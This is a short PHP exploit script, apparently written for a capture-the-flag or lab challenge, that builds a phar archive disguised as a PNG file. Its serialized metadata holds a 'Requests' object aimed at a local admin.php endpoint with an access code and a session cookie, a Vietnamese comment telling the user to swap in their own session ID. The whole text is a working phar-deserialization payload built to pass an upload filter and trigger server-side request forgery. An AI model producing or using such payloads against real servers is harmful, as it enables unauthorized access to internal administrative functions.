<?php
class Requests {
    public $url; private $options; private $postData; private $cookie;
    function __construct($url, $postData = '', $cookie = '', $options = array()) {
        $this->url = $url; $this->postData = $postData; $this->cookie = $cookie; $this->options = $options;
    }
}

@unlink("ssrf_admin.phar"); @unlink("ssrf_admin.png");
$phar = new Phar("ssrf_admin.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("\xff\xd8\xff\xe0" . "<?php __HALT_COMPILER(); ?>");

// Payload SSRF. Nhớ thay PHPSESSID của bạn vào đây!
$payload = new Requests(
    "http://127.0.0.1/admin.php", 
    "access_code=accesscode", 
    "PHPSESSID=kel94qk24rd9alu8f877m2ms0g" 
);
$phar->setMetadata($payload);
$phar->stopBuffering();
rename("ssrf_admin.phar", "ssrf_admin.png");
echo "Done ssrf_admin.png\n";
?>
